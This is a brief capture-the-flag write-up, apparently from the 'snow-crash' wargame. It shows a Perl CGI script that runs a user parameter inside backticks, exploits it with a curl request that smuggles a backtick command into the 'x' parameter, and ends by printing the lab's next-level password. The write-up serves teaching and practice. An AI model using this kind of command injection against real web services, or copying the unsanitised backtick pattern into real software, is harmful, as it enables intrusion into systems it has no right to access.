When we do `ls -la` we find a file `.pl`  owned by `flag04` so user `level04` can execute it as `flag04` 

When executing it we get a content-type response, part of a HTML header:

`Content-type: text/html`

Lets take a look at the code using cat 

```jsx
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

We can see that the code will print with echo the output of the command. In other words, it will print the value of x given as parameter.

Because it uses [localhost:4747](http://localhost:4747) as endpoint we will send a request there

```jsx
curl 'localhost:4747/level04.pl?x=`getflag`'
```

And there is the flag, so lets go to next level

```jsx
su level05
password ne2searoevaevoem4ov4ar8ap
```